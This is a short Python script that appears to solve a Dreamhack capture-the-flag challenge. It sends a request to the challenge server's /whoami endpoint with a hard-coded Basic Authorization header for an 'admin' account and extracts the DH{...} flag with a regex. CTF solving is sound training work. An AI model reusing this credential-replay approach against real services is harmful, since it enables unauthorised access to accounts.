import requests
import re

url = 'http://host3.dreamhack.games:22234'

headers = {
    'Authorization': 'Basic YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY='
}

res = requests.get(f'{url}/whoami', headers=headers)
match = re.search(r'DH\{[^}]*\}', res.text)
print(match.group(0))
